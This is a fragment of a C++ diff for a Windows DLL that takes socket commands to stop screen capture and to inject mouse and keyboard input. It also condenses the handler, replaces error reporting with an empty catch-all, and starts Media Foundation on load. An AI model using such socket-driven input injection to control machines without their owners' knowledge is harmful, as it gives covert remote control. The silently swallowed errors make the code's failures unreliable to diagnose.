+        else if (act == "monitorstop") {
             stop_capture_thread();
-
-            json response;
-            response["action"] = "monitorstatus";
-            response["status"] = "stopped";
-            safe_send_json(sock, response);
-            return;
-        }
-
-        if (action == "mouseevent") {
-            string event = command.value("event", "");
-            int button = command.value("button", 0);
-            int x = command.value("x", 0);
-            int y = command.value("y", 0);
-            simulate_mouse(event, button, x, y);
-            return;
-        }
-
-        if (action == "keyevent") {
-            string event = command.value("event", "");
-            int vk = command.value("key", 0);
-            simulate_key(event, vk);
-            return;
-        }
-
-        send_monitor_error(sock, "Unknown monitoring action");
-    } catch (const std::exception& e) {
-        send_monitor_error(sock, string("Command parse failed: ") + e.what());
-    } catch (...) {
-        send_monitor_error(sock, "Command parse failed");
-    }
+            json res; res["action"] = "monitorstatus"; res["status"] = "stopped";
+            safe_send_json(sock, res);
+        } else if (act == "mouseevent") simulate_mouse(cmd.value("event", ""), cmd.value("button", 0), cmd.value("x", 0), cmd.value("y", 0));
+        else if (act == "keyevent") simulate_key(cmd.value("event", ""), cmd.value("key", 0));
+    } catch (...) {}
 }
 
 BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
-    if (reason == DLL_PROCESS_DETACH) {
-        g_captureRunning.store(false);
-        shutdown_gdiplus();
-    }
+    if (reason == DLL_PROCESS_ATTACH) { MFStartup(0x00020070); }
+    if (reason == DLL_PROCESS_DETACH) { g_captureRunning.store(false); MFShutdown(); }
     return TRUE;
 }
